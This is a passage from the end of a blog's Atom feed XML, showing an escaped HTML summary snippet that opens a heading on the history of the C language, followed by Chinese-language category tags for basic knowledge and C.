        &lt;h3 id=&quot;font-color-navy1c语言的历史font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1c语言的历史font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;1.C语言的历史&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
</feed>
